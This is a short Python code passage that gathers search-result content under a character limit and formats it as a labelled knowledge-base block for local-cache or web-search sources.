    if not results.get("results"):
        return "", False
    
    knowledge_parts = []
    total_chars = 0
    
    for r in results["results"]:
        content = r.get("content", "")
        if content and total_chars + len(content) < max_chars:
            knowledge_parts.append(content)
            total_chars += len(content)
    
    if knowledge_parts:
        source = results.get("source", "unknown")
        header = "KNOWLEDGE BASE (local cache)" if source == "local_cache" else "KNOWLEDGE BASE (web search)"
        return f"\n\n{header}:\n" + "\n---\n".join(knowledge_parts), True
    
    return "", False